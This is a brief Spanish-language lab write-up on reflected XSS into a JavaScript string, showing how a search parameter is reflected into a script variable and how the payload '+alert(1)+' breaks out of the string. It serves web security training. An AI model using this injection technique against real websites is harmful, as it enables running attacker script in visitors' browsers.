---
title: "09 - Reflected XSS into a JavaScript string with angle brackets HTML encoded"
---

# 09 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

https://www.youtube.com/watch?v=eIHGNgibcjA
En un inicio el código no aparece en la página cuando hacemos la petición get en el campo de búsqueda se refleja el parámetro search en una variable de javascript, como podemos ver : 
```javascript
var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

```javascript
var searchTerms = '' + alert(1) + '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```
